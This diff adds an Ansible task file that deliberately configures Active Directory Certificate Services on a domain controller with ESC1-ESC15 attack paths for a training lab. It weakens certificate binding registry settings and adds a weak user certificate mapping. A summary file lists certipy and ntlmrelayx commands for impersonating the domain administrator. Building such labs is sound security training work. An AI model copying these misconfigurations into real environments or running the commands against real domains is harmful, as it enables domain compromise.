@@ -1,0 +1,203 @@
+---
+# Created by @ZephrFish 
+# https://zephrsec.com | https://blog.zsec.uk
+# adcs_lab - Configure ADCS for ESC1-16 attack paths
+# Target: DC01
+# Attack surface: ESC1-ESC15 ADCS attack paths — see ATTACK_PLAN.md
+
+# =============================================================================
+# Pre-flight assertions
+# =============================================================================
+
+- name: Assert required variables
+  ansible.builtin.assert:
+    that:
+      - domain_name is defined
+      - domain_name | length > 0
+      - ansible_host is defined
+      - inventory_hostname is defined
+    fail_msg: "Required variables not set: domain_name must be defined"
+    success_msg: "Pre-flight check passed"
+
+- name: Create ADCS lab directory
+  ansible.windows.win_file:
+    path: C:\Tools\ADCS
+    state: directory
+
+- name: Copy ADCS lab configuration script
+  ansible.windows.win_copy:
+    src: deploy-adcs-esc-lab.ps1
+    dest: C:\Tools\ADCS\deploy-adcs-esc-lab.ps1
+
+- name: Verify Certificate Authority is running
+  ansible.windows.win_service:
+    name: CertSvc
+    state: started
+  register: certsvc_status
+  ignore_errors: true
+
+- name: Deploy ADCS ESC lab
+  block:
+
+    - name: Deploy ADCS ESC1-16 vulnerable templates
+      ansible.windows.win_powershell:
+        script: |
+          Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+          $params = @('-Force', '-SkipDCConfig')
+          if (-not {{ adcs_enable_esc1  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC1'  }
+          if (-not {{ adcs_enable_esc2  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC2'  }
+          if (-not {{ adcs_enable_esc3  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC3'  }
+          if (-not {{ adcs_enable_esc4  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC4'  }
+          if (-not {{ adcs_enable_esc5  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC5'  }
+          if (-not {{ adcs_enable_esc6  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC6'  }
+          if (-not {{ adcs_enable_esc7  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC7'  }
+          if (-not {{ adcs_enable_esc8  | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC8'  }
+          if (-not {{ adcs_enable_esc11 | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC11' }
+          if (-not {{ adcs_enable_esc13 | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC13' }
+          if (-not {{ adcs_enable_esc14 | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC14' }
+          if (-not {{ adcs_enable_esc15 | default(true) | ternary('$true', '$false') }}) { $params += '-SkipESC15' }
+          & C:\Tools\ADCS\deploy-adcs-esc-lab.ps1 @params
+      register: adcs_result
+      changed_when: true
+      when: certsvc_status.state | default('') == 'running'
+
+  rescue:
+    - name: Log ADCS deployment failure
+      ansible.windows.win_powershell:
+        script: Add-Content -Path 'C:\Windows\Temp\zsec-ansible.log' -Value "FAILED adcs_lab {{ ansible_date_time.date | default('unknown') }} on {{ inventory_hostname }}" -ErrorAction SilentlyContinue
+      ignore_errors: true
+
+    - name: Capture Windows event log on failure
+      ansible.windows.win_powershell:
+        script: "Get-EventLog -LogName Application -Newest 20 | Format-List | Out-String"
+      register: win_event_log
+      ignore_errors: true
+
+    - name: Show event log
+      ansible.builtin.debug:
+        msg: "{{ win_event_log.output | default(['No logs available']) }}"
+
+    - name: Capture CertSvc status on failure
+      ansible.windows.win_powershell:
+        script: "Get-Service CertSvc | Format-List"
+      register: certsvc_failure_status
+      ignore_errors: true
+
+    - name: Show CertSvc status
+      ansible.builtin.debug:
+        msg: "{{ certsvc_failure_status.output | default(['No service info available']) }}"
+
+    - name: Fail with clear message
+      ansible.builtin.fail:
+        msg: "ADCS ESC lab deployment FAILED on {{ inventory_hostname }}"
+
+- name: Display ADCS lab status
+  ansible.builtin.debug:
+    msg: |
+      ADCS Lab Configuration Complete
+      ================================
+      Certificate Authority: {{ inventory_hostname }}
+      CA Service Status: {{ certsvc_status.state | default('unknown') }}
+
+      Vulnerable Templates Created:
+        - ESC1-VulnTemplate (Enrollee supplies subject)
+        - ESC2-AnyPurpose (Any purpose EKU)
+        - ESC2-NoEKU (No EKU defined)
+        - ESC3-EnrollmentAgent (Request on behalf of)
+        - ESC3-TargetTemplate (Target for agent requests)
+        - ESC4-WritableTemplate (Weak template ACLs)
+        - ESC13-IssuancePolicy (OID linked to Domain Admins)
+        - ESC15-SchemaV1 (EKConstraint bypass)
+
+      CA Vulnerabilities Enabled:
+        - ESC5: svc_backup has GenericWrite on Templates container
+        - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
+        - ESC7: svc_backup has ManageCA permission
+        - ESC8: Web Enrollment at http://{{ inventory_hostname }}/certsrv
+        - ESC11: IF_ENFORCEENCRYPTICERTREQUEST disabled
+
+      Note: ESC9/ESC10 require DC registry configuration (run separately on DC)
+
+# =============================================================================
+# DC Configuration Tasks (run on Domain Controller for ESC9/ESC10)
+# =============================================================================
+
+- name: Configure ESC9 - StrongCertificateBindingEnforcement (DC only)
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Services\Kdc
+    name: StrongCertificateBindingEnforcement
+    data: 0
+    type: dword
+  when:
+    - adcs_configure_dc_settings | default(false)
+
+- name: Configure ESC10 - CertificateMappingMethods (DC only)
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel
+    name: CertificateMappingMethods
+    data: 31
+    type: dword
+  when:
+    - adcs_configure_dc_settings | default(false)
+
+- name: Configure ESC14 - Add weak altSecurityIdentities to jsmith (DC only)
+  ansible.windows.win_powershell:
+    script: |
+      Import-Module ActiveDirectory
+      $user = Get-ADUser -Identity "jsmith" -ErrorAction SilentlyContinue
+      if ($user) {
+          $domainDN = (Get-ADDomain).DistinguishedName
+          $weakMapping = "X509:<S>CN=jsmith,CN=Users,$domainDN"
+          try {
+              Set-ADUser -Identity $user -Add @{altSecurityIdentities = $weakMapping}
+              Write-Output "Added weak altSecurityIdentities to jsmith"
+          } catch {
+              Write-Output "altSecurityIdentities already configured or error: $_"
+          }
+      } else {
+          Write-Output "jsmith user not found"
+      }
+  when:
+    - adcs_configure_dc_settings | default(false)
+  register: esc14_result
+  changed_when: "'Added weak' in (esc14_result.output | join(' '))"
+
+- name: Save ADCS lab configuration summary
+  ansible.windows.win_copy:
+    dest: "C:\\Tools\\adcs-lab-summary.txt"
+    content: |
+      ═══════════════════════════════════════════════════════════════
+      ZSEC ADCS Lab Configuration
+      Domain: {{ adcs_domain | default(domain_name | default('zsec.local')) }}
+      ═══════════════════════════════════════════════════════════════
+
+      CERTIFICATE AUTHORITY
+      ─────────────────────
+      CA Name:  zsec-CA
+      Service:  CertSvc (running)
+      Host:     {{ inventory_hostname }}
+
+      ESC VULNERABILITIES CONFIGURED
+      ───────────────────────────────
+      ESC1: Template with ENROLLEE_SUPPLIES_SUBJECT + any user enroll
+      ESC2: Template allows any purpose
+      ESC3: Template for certificate request agent
+      ESC4: Template with write ACL for domain users
+      ESC8: Web enrollment enabled (NTLM relay target)
+      ESC9: Certificate mapping via UPN (DC registry)
+      ESC10: SAN alternative names (DC registry)
+
+      ATTACK COMMANDS
+      ───────────────
+      # ESC1 - Impersonate Domain Admin
+      certipy find -u USER@{{ adcs_domain | default(domain_name | default('zsec.local')) }} -p PASS -dc-ip DC_IP
+      certipy req -u USER@{{ adcs_domain | default(domain_name | default('zsec.local')) }} -p PASS -ca zsec-CA -template VulnTemplate -upn administrator@{{ adcs_domain | default(domain_name | default('zsec.local')) }}
+
+      # ESC8 - NTLM Relay to Web Enrollment
+      ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp --adcs --template Machine
+      ═══════════════════════════════════════════════════════════════
+
+- name: Log successful deployment
+  ansible.windows.win_powershell:
+    script: Add-Content -Path 'C:\Windows\Temp\zsec-ansible.log' -Value "OK adcs_lab on {{ inventory_hostname }}" -ErrorAction SilentlyContinue
+  ignore_errors: true
